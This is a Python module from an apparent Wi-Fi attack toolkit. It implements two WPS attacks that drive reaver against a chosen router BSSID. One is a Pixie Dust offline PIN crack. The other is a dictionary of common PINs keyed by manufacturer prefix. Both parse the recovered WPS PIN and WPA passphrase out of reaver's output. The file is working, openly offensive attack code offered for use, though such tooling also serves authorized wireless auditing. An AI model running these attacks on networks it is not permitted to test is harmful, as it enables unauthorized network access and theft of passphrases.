"""
WPS attacks: Pixie Dust and PIN dictionary.
"""

import asyncio
import re
import structlog
import time
from datetime import datetime
from pathlib import Path
from typing import Any, Callable, Optional

from urban_hs.modules.wifi.attacks.base import AttackResult, AttackStatus, BaseAttack

logger = structlog.get_logger(__name__)


class WPSPixieAttack(BaseAttack):
    """
    WPS Pixie Dust Attack (Offline).

    Uses reaver with pixiewps to perform offline WPS PIN cracking.
    """

    def __init__(
        self,
        interface: str,
        output_dir: Optional[str] = None,
        attack_timeout: int = 180,
    ):
        if output_dir is None:
            from urban_hs.core.config import get_config
            output_dir = str(Path(get_config().storage.resolve_wifi_attacks_dir()) / "wps")
        super().__init__(interface, output_dir, attack_timeout)

    async def execute(
        self,
        target_bssid: str,
        target_essid: Optional[str] = None,
        channel: int = 1,
        callback: Optional[Callable[[str], None]] = None,
    ) -> AttackResult:
        result = AttackResult(
            attack_type="wps_pixie",
            target_bssid=target_bssid,
            target_essid=target_essid,
            status=AttackStatus.RUNNING,
            started_at=datetime.utcnow(),
        )

        self._running = True
        safe_bssid = target_bssid.replace(":", "_")
        timestamp = int(time.time())
        base_name = f"wps_pixie_{safe_bssid}_{timestamp}"
        pcap_file = self.output_dir / f"{base_name}.pcap"

        result.output_files = [str(pcap_file)]

        try:
            self._log("Starting WPS Pixie Dust attack", bssid=target_bssid)
            self._notify_callback(callback, f"Starting WPS Pixie Dust attack on {target_bssid}")

            cmd = [
                "reaver",
                "-i", self.interface,
                "-b", target_bssid,
                "-c", str(channel),
                "-K", "1",
                "-o", str(self.output_dir / f"{base_name}.log"),
                "-w",
                "-d", "10",
            ]

            if target_essid:
                cmd.extend(["-e", target_essid])

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            self._log("reaver process started", pid=proc.pid)
            self._notify_callback(callback, f"Reaver started (PID: {proc.pid})")

            try:
                await asyncio.wait_for(proc.wait(), timeout=self.attack_timeout * 3)
            except asyncio.TimeoutError:
                proc.kill()
                await proc.wait()

            result.finished_at = datetime.utcnow()

            if proc.stdout:
                stdout_data = await proc.stdout.read()
                output = stdout_data.decode()

                pin_match = re.search(r"WPS PIN:\s*(\d+)", output)
                psk_match = re.search(r"WPA PSK:\s*(.+)", output)

                if pin_match:
                    result.wps_pin = pin_match.group(1)
                    result.status = AttackStatus.SUCCESS
                    self._notify_callback(callback, f"WPS PIN found: {result.wps_pin}")

                    if psk_match:
                        result.wps_psk = psk_match.group(1)
                        self._notify_callback(callback, f"WPA PSK found: {result.wps_psk}")
                else:
                    result.status = AttackStatus.FAILED
                    if proc.stderr:
                        stderr_data = await proc.stderr.read()
                        result.error_message = stderr_data.decode()[:500]

        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error_message = str(e)
        finally:
            self._running = False

        return result


class WPSPinAttack(BaseAttack):
    """
    WPS Common PIN Dictionary Attack.

    Uses known common PINs for various manufacturers.
    """

    OUI_PINS = {
        "00:1a:2b": ["12345670", "00000000", "11111111"],
        "00:1b:2c": ["12345670", "00000000", "22222222"],
    }

    def __init__(
        self,
        interface: str,
        output_dir: Optional[str] = None,
        attack_timeout: int = 300,
    ):
        if output_dir is None:
            from urban_hs.core.config import get_config
            output_dir = str(Path(get_config().storage.resolve_wifi_attacks_dir()) / "wps")
        super().__init__(interface, output_dir, attack_timeout)

    async def execute(
        self,
        target_bssid: str,
        target_essid: Optional[str] = None,
        channel: int = 1,
        callback: Optional[Callable[[str], None]] = None,
    ) -> AttackResult:
        result = AttackResult(
            attack_type="wps_pin",
            target_bssid=target_bssid,
            target_essid=target_essid,
            status=AttackStatus.RUNNING,
            started_at=datetime.utcnow(),
        )

        self._running = True

        oui = target_bssid[:8].lower()
        pins = self.OUI_PINS.get(oui, ["12345670", "00000000", "11111111", "22222222", "33333333"])

        safe_bssid = target_bssid.replace(":", "_")
        timestamp = int(time.time())
        base_name = f"wps_pin_{safe_bssid}_{timestamp}"

        try:
            self._log("Starting WPS PIN attack", bssid=target_bssid, pins=len(pins))
            self._notify_callback(callback, f"Trying {len(pins)} common PINs")

            for pin in pins:
                if not self._running:
                    break

                cmd = [
                    "reaver",
                    "-i", self.interface,
                    "-b", target_bssid,
                    "-c", str(channel),
                    "-p", pin,
                    "-o", str(self.output_dir / f"{base_name}_{pin}.log"),
                ]

                if target_essid:
                    cmd.extend(["-e", target_essid])

                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )

                try:
                    await asyncio.wait_for(proc.wait(), timeout=60)

                    if proc.stdout:
                        stdout_data = await proc.stdout.read()
                        output = stdout_data.decode()
                        psk_match = re.search(r"WPA PSK:\s*(.+)", output)
                        if psk_match:
                            result.wps_pin = pin
                            result.wps_psk = psk_match.group(1)
                            result.status = AttackStatus.SUCCESS
                            self._notify_callback(callback, f"WPS PIN found: {pin}, PSK: {result.wps_psk}")
                            break

                except asyncio.TimeoutError:
                    proc.kill()
                    await proc.wait()
                    continue

            result.finished_at = datetime.utcnow()

            if result.status != AttackStatus.SUCCESS:
                result.status = AttackStatus.FAILED
                result.error_message = "No valid PIN found in dictionary"

        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error_message = str(e)
        finally:
            self._running = False

        return result
